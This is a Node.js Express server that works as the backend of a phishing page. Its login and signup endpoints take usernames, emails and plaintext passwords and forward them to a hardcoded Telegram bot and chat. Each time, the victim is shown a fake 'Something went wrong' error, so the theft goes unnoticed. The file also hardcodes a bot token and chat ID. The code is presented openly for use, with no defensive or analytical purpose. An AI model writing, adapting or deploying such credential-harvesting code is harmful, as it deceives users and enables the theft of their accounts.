import express from "express";
import bodyParser from "body-parser";
import fetch from "node-fetch";

const app = express();
const PORT = 3000;

// Hardcoded Telegram details
const TELEGRAM_BOT_TOKEN = "7464243291:AAFx4YjwJDm2u_anOt7-IKblQ2AIVa35PGM";
const TELEGRAM_CHAT_ID = "-1002396284075";

app.use(bodyParser.json());

/**
 * Login API - Sends login details to Telegram
 */
app.post("/send-login", async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res
                .status(400)
                .json({ error: "Username and password are required" });
        }

        const message = ` *Login Attempt* 🔑\n👤 Username: ${username}\n🔒 Password: ${password}`;
        await sendMessageToTelegram(message);

        res.status(200).json({
            success: false,
            message: "Something went wrong",
        });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ error: "Failed" });
    }
});

/**
 * Signup API - Sends signup details to Telegram
 */
app.post("/send-signup", async (req, res) => {
    try {
        const { username, email, password } = req.body;

        if (!username || !email || !password) {
            return res
                .status(400)
                .json({ error: "Username, email, and password are required" });
        }

        const message = `*New Signup* 📝\n👤 Name: ${username}\n📧 Email: ${email}\n🔑 Password: ${password}`;
        await sendMessageToTelegram(message);

        res.status(200).json({
            success: false,
            message: "Something went wrong",
        });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ error: "Failed" });
    }
});

/**
 * Function to send message to Telegram
 */
async function sendMessageToTelegram(message) {
    const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "Markdown",
            }),
        },
    );

    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
}

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
